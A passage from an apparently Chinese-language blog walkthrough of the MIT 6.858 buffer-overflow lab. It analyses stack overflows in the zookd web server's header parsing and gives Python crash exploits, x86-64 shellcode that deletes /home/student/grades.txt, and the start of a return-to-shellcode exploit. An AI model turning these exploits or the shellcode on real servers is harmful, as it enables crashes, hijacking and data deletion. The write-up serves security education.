calls starting from <code>process_client</code>).</p><p>It is worth taking your time on this exercise and familiarizing yourself with the code, because your next job is to exploit the vulnerability you identified. In fact, you may want to go back and forth between this exercise and later exercises, as you work out the details and document them. That is, if you find a buffer overflow that you think can be exploited, you can use later exercises to figure out if it indeed can be exploited. It will be helpful to draw a stack diagram like the figures in <a href="https://thesquareplanet.com/blog/smashing-the-stack-21st-century/">Smashing the Stack in the 21st Century</a>.</p></blockquote><p>大概是阅读  <code>zookd.c</code> 和 <code>http.c</code> 找漏洞，提示关注在栈上分配的 buffer，并将答案写在 <code>answers.txt</code> 中<del>（👴：❓）</del></p><p>首先看 <code>zookd.c</code>，源码比较简洁，核心逻辑在 <code>run_server()</code> 中，首先会调用 <code>start_server()</code> 创建一个 http 服务器，之后在 <code>run_server()</code> 中有一个无限循环调用 <code>accept()</code> 接收请求后 <code>fork()</code> 出子进程调用 <code>process_client()</code> 处理</p><h4 id="process-client-：处理单次-HTTP-request"><a href="#process-client-：处理单次-HTTP-request" class="headerlink" title="process_client()：处理单次 HTTP request"></a>process_client()：处理单次 HTTP request</h4><p> <code>process_client()</code> 的逻辑也比较简单，主要是调用 <code>http_request_line()</code> 获取请求头第一行，之后给到 <code>env_deserialize()</code> 解析环境变量，之后调用 <code>http_request_headers()</code> 解析剩下的 header，最后调用 <code>http_serve()</code> 处理</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">process_client</span><span class="hljs-params">(<span class="hljs-type">int</span> fd)</span><br>&#123;<br>    <span class="hljs-type">static</span> <span class="hljs-type">char</span> env[<span class="hljs-number">8192</span>];  <span class="hljs-comment">/* static variables are not on the stack */</span><br>    <span class="hljs-type">static</span> <span class="hljs-type">size_t</span> env_len = <span class="hljs-number">8192</span>;<br>    <span class="hljs-type">char</span> reqpath[<span class="hljs-number">4096</span>];<br>    <span class="hljs-type">const</span> <span class="hljs-type">char</span> *errmsg;<br><br>    <span class="hljs-comment">/* get the request line */</span><br>    <span class="hljs-keyword">if</span> ((errmsg = http_request_line(fd, reqpath, env, &amp;env_len)))<br>        <span class="hljs-keyword">return</span> http_err(fd, <span class="hljs-number">500</span>, <span class="hljs-string">&quot;http_request_line: %s&quot;</span>, errmsg);<br><br>    env_deserialize(env, <span class="hljs-keyword">sizeof</span>(env));<br><br>    <span class="hljs-comment">/* get all headers */</span><br>    <span class="hljs-keyword">if</span> ((errmsg = http_request_headers(fd)))<br>      http_err(fd, <span class="hljs-number">500</span>, <span class="hljs-string">&quot;http_request_headers: %s&quot;</span>, errmsg);<br>    <span class="hljs-keyword">else</span><br>      http_serve(fd, getenv(<span class="hljs-string">&quot;REQUEST_URI&quot;</span>));<br><br>    close(fd);<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="http-request-line-：解析-header-第一行"><a href="#http-request-line-：解析-header-第一行" class="headerlink" title="http_request_line()：解析 header 第一行"></a>http_request_line()：解析 header 第一行</h4><p>现在来看 <code>http_request_line()</code>，其首先调用了一个函数 <code>http_read_line()</code> 从 TCP 连接中读取一整行（read() 一个字节一个字节地读，一直读到 <code>\n</code> 并返回读取的字节数，对于 <code>\r</code> 自动跳过，失败则返回 <code>-1</code>，代码就不贴了）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">const</span> <span class="hljs-type">char</span> *<span class="hljs-title function_">http_request_line</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">char</span> *reqpath, <span class="hljs-type">char</span> *env, <span class="hljs-type">size_t</span> *env_len)</span><br>&#123;<br>    <span class="hljs-type">static</span> <span class="hljs-type">char</span> buf[<span class="hljs-number">8192</span>];      <span class="hljs-comment">/* static variables are not on the stack */</span><br>    <span class="hljs-type">char</span> *sp1, *sp2, *qp, *envp = env;<br><br>    <span class="hljs-comment">/* For lab 2: don&#x27;t remove this line. */</span><br>    touch(<span class="hljs-string">&quot;http_request_line&quot;</span>);<br><br>    <span class="hljs-keyword">if</span> (http_read_line(fd, buf, <span class="hljs-keyword">sizeof</span>(buf)) &lt; <span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Socket IO error&quot;</span>;<br></code></pre></td></tr></table></figure><p>之后解析路径与请求类型，主要就是用 <code>strchr()</code> 进行分隔后判断，并将结果写到 <code>env</code> 中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Parse request like &quot;GET /foo.html HTTP/1.0&quot; */</span><br>sp1 = <span class="hljs-built_in">strchr</span>(buf, <span class="hljs-string">&#x27; &#x27;</span>);<br><span class="hljs-keyword">if</span> (!sp1)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Cannot parse HTTP request (1)&quot;</span>;<br>*sp1 = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>sp1++;<br><span class="hljs-keyword">if</span> (*sp1 != <span class="hljs-string">&#x27;/&#x27;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Bad request path&quot;</span>;<br><br>sp2 = <span class="hljs-built_in">strchr</span>(sp1, <span class="hljs-string">&#x27; &#x27;</span>);<br><span class="hljs-keyword">if</span> (!sp2)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Cannot parse HTTP request (2)&quot;</span>;<br>*sp2 = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>sp2++;<br><br><span class="hljs-comment">/* We only support GET and POST requests */</span><br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(buf, <span class="hljs-string">&quot;GET&quot;</span>) &amp;&amp; <span class="hljs-built_in">strcmp</span>(buf, <span class="hljs-string">&quot;POST&quot;</span>))<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Unsupported request (not GET or POST)&quot;</span>;<br><br>envp += <span class="hljs-built_in">sprintf</span>(envp, <span class="hljs-string">&quot;REQUEST_METHOD=%s&quot;</span>, buf) + <span class="hljs-number">1</span>;<br>envp += <span class="hljs-built_in">sprintf</span>(envp, <span class="hljs-string">&quot;SERVER_PROTOCOL=%s&quot;</span>, sp2) + <span class="hljs-number">1</span>;<br></code></pre></td></tr></table></figure><p>然后解析请求中的参数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* parse out query string, e.g. &quot;foo.py?user=bob&quot; */</span><br><span class="hljs-keyword">if</span> ((qp = <span class="hljs-built_in">strchr</span>(sp1, <span class="hljs-string">&#x27;?&#x27;</span>)))<br>&#123;<br>    *qp = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>    envp += <span class="hljs-built_in">sprintf</span>(envp, <span class="hljs-string">&quot;QUERY_STRING=%s&quot;</span>, qp + <span class="hljs-number">1</span>) + <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>之后调用 <code>url_decode(dst, src)</code> 解析 request URL，这个函数主要就是把 URL 里的 <code>%ab</code> 换成 <code>0xab</code> ，把 <code>+</code> 换成 空格，由 <code>src</code> 拷贝到 <code>dst</code> ；最后将结果写回 <code>env</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c">    <span class="hljs-comment">/* decode URL escape sequences in the requested path into reqpath */</span><br>    url_decode(reqpath, sp1);<br><br>    envp += <span class="hljs-built_in">sprintf</span>(envp, <span class="hljs-string">&quot;REQUEST_URI=%s&quot;</span>, reqpath) + <span class="hljs-number">1</span>;<br><br>    envp += <span class="hljs-built_in">sprintf</span>(envp, <span class="hljs-string">&quot;SERVER_NAME=zoobar.org&quot;</span>) + <span class="hljs-number">1</span>;<br><br>    *envp = <span class="hljs-number">0</span>;<br>    *env_len = envp - env + <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="http-request-headers-：解析-header-剩余部分（存在漏洞）"><a href="#http-request-headers-：解析-header-剩余部分（存在漏洞）" class="headerlink" title="http_request_headers()：解析 header 剩余部分（存在漏洞）"></a>http_request_headers()：解析 header 剩余部分（存在漏洞）</h4><p>进来首先是一个大循环，每次循环都会调用 <code>http_read_line()</code> 读取一行 header 进行解析：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">const</span> <span class="hljs-type">char</span> *<span class="hljs-title function_">http_request_headers</span><span class="hljs-params">(<span class="hljs-type">int</span> fd)</span><br>&#123;<br>    <span class="hljs-type">static</span> <span class="hljs-type">char</span> buf[<span class="hljs-number">8192</span>];      <span class="hljs-comment">/* static variables are not on the stack */</span><br>    <span class="hljs-type">int</span> i;<br>    <span class="hljs-type">char</span> value[<span class="hljs-number">512</span>];<br>    <span class="hljs-type">char</span> envvar[<span class="hljs-number">512</span>];<br><br>    <span class="hljs-comment">/* For lab 2: don&#x27;t remove this line. */</span><br>    touch(<span class="hljs-string">&quot;http_request_headers&quot;</span>);<br><br>    <span class="hljs-comment">/* Now parse HTTP headers */</span><br>    <span class="hljs-keyword">for</span> (;;)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (http_read_line(fd, buf, <span class="hljs-keyword">sizeof</span>(buf)) &lt; <span class="hljs-number">0</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Socket IO error&quot;</span>;<br><br>        <span class="hljs-keyword">if</span> (buf[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;\0&#x27;</span>)     <span class="hljs-comment">/* end of headers */</span><br>            <span class="hljs-keyword">break</span>;<br></code></pre></td></tr></table></figure><p>之后是解析 <code>key: value</code> 型的值，首先是 <code>shrchr()</code> 按空格进行分割，然后将 <code>key</code> 转成大写且 <code>-</code> 转成 <code>_</code> ，之后调用 <code>url_decode()</code> 解析</p><ul><li>这里我们注意到 <code>value</code> 是一个<strong>位于函数栈上的字符数组，长度仅为 512</strong>，而该 HTTP server 所允许的单行最大长度为 8192 字符，这意味着<strong>我们可以很轻易地通过传入一个较长的键值对参数来完成栈溢出</strong></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Parse things like &quot;Cookie: foo bar&quot; */</span><br><span class="hljs-type">char</span> *sp = <span class="hljs-built_in">strchr</span>(buf, <span class="hljs-string">&#x27; &#x27;</span>);<br><span class="hljs-keyword">if</span> (!sp)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Header parse error (1)&quot;</span>;<br>*sp = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>sp++;<br><br><span class="hljs-comment">/* Strip off the colon, making sure it&#x27;s there */</span><br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">strlen</span>(buf) == <span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Header parse error (2)&quot;</span>;<br><br><span class="hljs-type">char</span> *colon = &amp;buf[<span class="hljs-built_in">strlen</span>(buf) - <span class="hljs-number">1</span>];<br><span class="hljs-keyword">if</span> (*colon != <span class="hljs-string">&#x27;:&#x27;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Header parse error (3)&quot;</span>;<br>*colon = <span class="hljs-string">&#x27;\0&#x27;</span>;<br><br><span class="hljs-comment">/* Set the header name to uppercase and replace hyphens with underscores */</span><br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">strlen</span>(buf); i++) &#123;<br>    buf[i] = <span class="hljs-built_in">toupper</span>(buf[i]);<br>    <span class="hljs-keyword">if</span> (buf[i] == <span class="hljs-string">&#x27;-&#x27;</span>)<br>        buf[i] = <span class="hljs-string">&#x27;_&#x27;</span>;<br>&#125;<br><br><span class="hljs-comment">/* Decode URL escape sequences in the value */</span><br>url_decode(value, sp);<br></code></pre></td></tr></table></figure><p>最后部分就是如果 <code>key</code> 不为 <code>CONTENT_TYPE</code> 或 <code>CONTENT_LENGTH</code> 则在前面加上字符串 <code>HTTP_</code> 后存储到 <code>envvar</code> 中，并调用 <code>setenv()</code> 设置  <em>环境变量</em>  中的对应值</p><ul><li>这里我们注意到 <code>envvar</code> 也是一个<strong>位于函数栈上的长度仅为 512的字符数组</strong>，因此在这里也可以发生<strong>栈溢出</strong></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c">        <span class="hljs-comment">/* Store header in env. variable for application code */</span><br>        <span class="hljs-comment">/* Some special headers don&#x27;t use the HTTP_ prefix. */</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(buf, <span class="hljs-string">&quot;CONTENT_TYPE&quot;</span>) != <span class="hljs-number">0</span> &amp;&amp;<br>            <span class="hljs-built_in">strcmp</span>(buf, <span class="hljs-string">&quot;CONTENT_LENGTH&quot;</span>) != <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">sprintf</span>(envvar, <span class="hljs-string">&quot;HTTP_%s&quot;</span>, buf);<br>            setenv(envvar, value, <span class="hljs-number">1</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            setenv(buf, value, <span class="hljs-number">1</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>那么下面我们来到 Exercise2，写一个 exp 来让 zookd 程序 crash 掉：</p><blockquote><p><strong>Exercise 2.</strong> Write an exploit that uses a buffer overflow to crash the web server (or one of the processes it creates). You do not need to inject code at this point. Verify that your exploit crashes the server by checking the last few lines of <code>dmesg | tail</code>, using <code>gdb</code>, or observing that the web server crashes (i.e., it will print <code>Child process 9999 terminated incorrectly, receiving signal 11</code>)</p><p>Provide the code for the exploit in a file called <code>exploit-2.py</code>.</p><p>The vulnerability you found in Exercise 1 may be too hard to exploit. Feel free to find and exploit a different vulnerability.</p></blockquote><p>我们现在来测试一下这个漏洞，首先编写一个正常的 HTTP Get 请求：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exp</span>(<span class="hljs-params">host, port</span>):<br>    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>    sock.connect((host, <span class="hljs-built_in">int</span>(port)))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Connected to the server. Sending request now...&quot;</span>)<br><br>    payload = <span class="hljs-string">b&quot;GET / HTTP/1.0\r\n&quot;</span><br>    payload += <span class="hljs-string">b&quot;arttnba3: &quot;</span> + <span class="hljs-string">b&quot;rat3bant&quot;</span> + <span class="hljs-string">b&quot;\r\n&quot;</span><br>    payload += <span class="hljs-string">b&quot;\r\n&quot;</span><br>    sock.send(payload)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Receiving response...&quot;</span>)<br>    rbuf = sock.recv(<span class="hljs-number">1024</span>)<br>    resp = <span class="hljs-string">b&#x27;&#x27;</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(rbuf):<br>        resp += rbuf<br>        rbuf = sock.recv(<span class="hljs-number">1024</span>)<br>    <br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Got response:&quot;</span>)<br>    <span class="hljs-built_in">print</span>(resp)<br><br>    sock.close()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) != <span class="hljs-number">3</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Usage: &#123;&#125; host port&quot;</span>.<span class="hljs-built_in">format</span>(sys.argv[<span class="hljs-number">0</span>]))<br>        exit(-<span class="hljs-number">1</span>)<br>    exp(sys.argv[<span class="hljs-number">1</span>], sys.argv[<span class="hljs-number">2</span>])<br></code></pre></td></tr></table></figure><p>效果如下：</p><p><img src="https://s2.loli.net/2022/11/29/PujgG7EJVMmOiz1.png" alt="image.png"></p><p>接下来我们尝试利用 <code>envvar</code> 进行溢出测试：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exp</span>():<br>    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>    sock.connect((<span class="hljs-string">&#x27;localhost&#x27;</span>, <span class="hljs-number">8080</span>))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Connected to the server. Sending request now...&quot;</span>)<br><br>    payload = <span class="hljs-string">b&quot;GET / HTTP/1.0\r\n&quot;</span><br>    payload += <span class="hljs-string">b&quot;arttnba3: &quot;</span> + <span class="hljs-string">b&quot;rat3bant&quot;</span> * <span class="hljs-number">512</span> + <span class="hljs-string">b&quot;\r\n&quot;</span><br>    payload += <span class="hljs-string">b&quot;\r\n&quot;</span><br>    sock.send(payload)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Receiving response...&quot;</span>)<br>    rbuf = sock.recv(<span class="hljs-number">1024</span>)<br>    resp = <span class="hljs-string">b&#x27;&#x27;</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(rbuf):<br>        resp += rbuf<br>        rbuf = sock.recv(<span class="hljs-number">1024</span>)<br>    <br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Got response:&quot;</span>)<br>    <span class="hljs-built_in">print</span>(resp)<br><br>    sock.close()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    exp()<br></code></pre></td></tr></table></figure><p>可以看到 zookd 提示了子进程收到了 <code>signal 11</code>（也就是 <code>SIGSEGV</code>），同时我们收到的响应也为空字符串，说明我们成功触发了这个漏洞</p><p><img src="https://s2.loli.net/2022/12/03/oWwStCVeFG5Qd6Z.png" alt="image.png"></p><blockquote><p>MIT 其实还贴心地提供了一个 <code>exploit-template.py</code> 文件，让笔者这种不怎么会用 socket 写裸 HTTP 请求的菜鸡可以参考（笑），<del>他真的👴哭死</del></p></blockquote><p>将文件名改成 <code>exploit-2.py</code> 后我们可以使用如下命令进行评测：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">make check-crash</span><br></code></pre></td></tr></table></figure><p>评测的原理是检查 <code>/tmp/strace.log</code> 当中是否有 <code>SIGSEGV</code> 字符串，笔者也不知道为什么反正笔者电脑上没有这个文件，所以这里就跳过了（<del>👴的评价是🔈↑↓</del>）</p><blockquote><p>但是比较 SB 的是评测用的是 MIT 编译的 zookd 而不是我们自行编译的，然后他就会给👴报这种SB错误：</p><p><img src="https://s2.loli.net/2022/11/29/Fs1Ka4xTNtWXPrq.png" alt="image.png"></p><p>然后👴自己再重新试着跑 zookd 会发现，<del>因为👴的学生🐓是老旧的 Ubuntu20，👴的评价是🔈↑↓</del>：</p><p><img src="https://s2.loli.net/2022/11/29/uBRnHQ4lMjfwLrU.png" alt="image.png"></p><p>最后笔者的解决方案是拉了一个 Ubuntu 22.04 的容器在里面做…</p></blockquote><h2 id="Part-2-Code-injection"><a href="#Part-2-Code-injection" class="headerlink" title="Part 2: Code injection"></a>Part 2: Code injection</h2><p>这一部分主要是让我们进行代码注入来删掉服务器上的 <code>/home/student/grades.txt</code> 文件（自己创一个就行），要求我们使用栈具有可执行权限的 <code>zookd-exstack</code>：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">./clean-env.sh ./zookd-exstack 8080</span><br></code></pre></td></tr></table></figure><p>实验还为我们提供了一份 shellcode 模板 <code>shellcode.S</code>，当我们 <code>make</code> 的时候其会被编译成 <code>shellcode.bin</code>，我们可以使用 <code>run-shellcode</code> 来验证其功能性：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">./run-shellcode shellcode.bin</span><br></code></pre></td></tr></table></figure><p>接下来是 Exercise3，修改 shellcode 使其能删除  <code>/home/student/grades.txt</code>：</p><blockquote><p><strong>Exercise 3 (warm-up).</strong> Modify <code>shellcode.S</code> to unlink <code>/home/student/grades.txt</code>. Your assembly code can either invoke the <code>SYS_unlink</code> system call, or call the <code>unlink()</code> library function.</p></blockquote><p>里边是<del>丑陋的</del> AT&amp;T 汇编，笔者选择直接重写一份：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.globl main<br>.typemain, @function<br><br> main:<br>/* store the string on the stack */<br>xorq  %rax, %rax<br>pushq %rax<br>movq  $0x7478742e73656461, %rax /* &quot;ades.txt&quot; */<br>pushq %rax<br>movq  $0x72672f746e656475, %rax /* &quot;udent/gr&quot; */<br>pushq %rax<br>movq  $0x74732f656d6f682f, %rax /* &quot;/home/st&quot; */<br>pushq %rax<br><br>/* unlink(rsp) */<br>pushq %rsp<br>popq  %rdi<br>movq  $87, %rax /* SYS_unlink */<br>syscall<br><br>/* exit() */<br>xorq  %rdi, %rdi<br>movq  $60, %rax/* SYS_exit */<br>syscall<br><br></code></pre></td></tr></table></figure><p>成功删除文件：</p><p><img src="https://s2.loli.net/2022/12/03/FX8UsCbyW72fOtw.png" alt="image.png"></p><p>之后实验文件提示我们可以使用 strace 来跟踪 zookd 所使用的系统调用（需要root）：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">strace -f -p $(pgrep zookd-)</span><br></code></pre></td></tr></table></figure><p>比如说笔者先起一个 zookd 再运行 strace，之后用前面的 exp 打一下 zookd 就可以看到：</p><p><img src="https://s2.loli.net/2022/12/03/oKDm5yIjCin6OpG.png" alt="image.png"></p><p>前面的评测应该是基于这个完成的，但是笔者发现在 <code>/tmp/strace.log</code> 当中不会记录 <code>SIGSEGV</code> 字符串，<del>👴也不知道为什么所以这里就先⑧管了</del></p><p><img src="https://s2.loli.net/2022/12/03/GkpjiZWb71HyhD3.png" alt="image.png"></p><p>以及我们也可以使用 gdb 进行调试：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">gdb -p $(pgrep zookd-)</span><br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/12/03/M8HgfPEkdl2Vypi.png" alt="image.png"></p><p>之后实验手册扯了一堆怎么调试，这里就不管了，下面来看 Exercise 4，大概是让我们用 ret2shellcode 来打 zookd</p><blockquote><p><strong>Exercise 4.</strong> Starting from one of your exploits from Exercise 2, construct an exploit that hijacks the control flow of the web server and unlinks <code>/home/student/grades.txt</code>. Save this exploit in a file called <code>exploit-4.py</code>.</p><p>Verify that your exploit works; you will need to re-create <code>/home/student/grades.txt</code> after each successful exploit run.</p><p>Suggestion: first focus on obtaining control of the program counter. Sketch out the stack layout that you expect the program to have at the point when you overflow the buffer, and use <code>gdb</code> to verify that your overflow data ends up where you expect it to. Step through the execution of the function to the return instruction to make sure you can control what address the program returns to. The <code>next</code>, <code>stepi</code>, and <a href="https://visualgdb.com/gdbreference/commands/x"><code>x</code></a> commands in <code>gdb</code> should prove helpful.</p><p>Once you can reliably hijack the control flow of the program, find a suitable address that will contain the code you want to execute, and focus on placing the correct code at that address—e.g. a derivative of the provided shell code.</p></blockquote><p>因为没有开 ASLR 而且栈具有可执行权限，那么笔者直接用 <code>nop</code> 作为 slide code 并在栈上靠后的位置布置 shellcode 即可，这里注意别忘了把 shellcode 当中的 <code>\x00</code> 编码成 <code>%00</code> 否则会被过滤掉</p><blockquote><p>编写 shellcode 是 pwn 手最基础的技能，如果你不会的话……  ：）</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span 